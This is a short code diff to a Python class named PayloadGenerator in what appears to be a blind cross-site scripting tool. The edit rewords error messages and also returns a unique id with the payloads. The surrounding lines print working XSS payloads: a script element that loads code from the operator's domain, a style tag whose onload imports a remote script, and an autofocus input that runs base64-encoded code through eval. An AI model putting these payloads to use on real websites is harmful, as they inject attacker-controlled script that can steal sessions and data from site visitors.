@@ -26,10 +26,10 @@ class PayloadGenerator:
                     print(f"Invalid API key. Please check your config file. ({Config().config_location})")
                     exit()
                 else:
-                    print(f"Error sending payload to server: {response.status_code} - {response.text}")
+                    print(f"Error communicating with bxss server: {response.status_code} - {response.text}")
                     exit()
         except requests.exceptions.RequestException as e:
-            print(f"Error sending payload to server: {e}")
+            print(f"Error communicating with bxss server: {e}")
             exit()
 
         base64Code = f'var a=document.createElement("script");a.src="//{self.config.domain}/{unique_id}";document.body.appendChild(a);'.encode('utf-8')
@@ -40,7 +40,7 @@ class PayloadGenerator:
             f'\"\'><style/onload=import("//{self.config.domain}/{unique_id}")></style>',
             f'\'\"><input on onfocus=eval(atob(this.id)) id={base64Code} autofocus>'
         ]
-        self.payloads = payloads
+        self.payloads = unique_id, payloads
 
     def get_payloads(self, target):
         self.generate_payloads(target)
